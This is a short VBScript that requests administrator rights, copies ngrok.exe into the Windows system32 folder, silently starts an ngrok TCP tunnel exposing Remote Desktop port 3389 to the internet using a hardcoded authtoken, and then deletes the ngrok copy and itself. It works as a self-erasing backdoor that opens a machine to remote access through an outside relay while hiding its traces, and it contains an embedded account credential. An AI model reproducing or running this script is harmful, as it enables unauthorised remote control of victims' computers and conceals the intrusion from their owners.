Set sh = CreateObject("WScript.Shell")
If WScript.Arguments.Count = 0 Then
    CreateObject("Shell.Application").ShellExecute WScript.FullName, _
      Chr(34) & WScript.ScriptFullName & Chr(34) & " " & _
      Chr(34) & sh.CurrentDirectory & Chr(34), , "runas", 1
    WScript.Quit 0
End If
sh.CurrentDirectory = WScript.Arguments(0)

set WshShell = WScript.CreateObject("WScript.Shell")
WINDIR = WshShell.ExpandEnvironmentStrings("%WinDir%")
Const OverwriteExisting = True
Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.CopyFile "ngrok.exe", WINDIR &"\system32\ngrok.exe" , OverwriteExisting

WScript.CreateObject("WScript.Shell").run "cmd.exe /c ngrok config add-authtoken 2O3EGLOeVQvQNJ66ZOju4nSaprX_85UmShQ5vDHB2PsrvamVj & ngrok tcp 3389 --log nglogfile.txt", 0

File="ngrok.exe" 
Set fso = CreateObject("Scripting.FileSystemObject")
fso.DeleteFile File
Set FSO = CreateObject("Scripting.FileSystemObject")
FSO.DeleteFile WScript.ScriptFullName, 0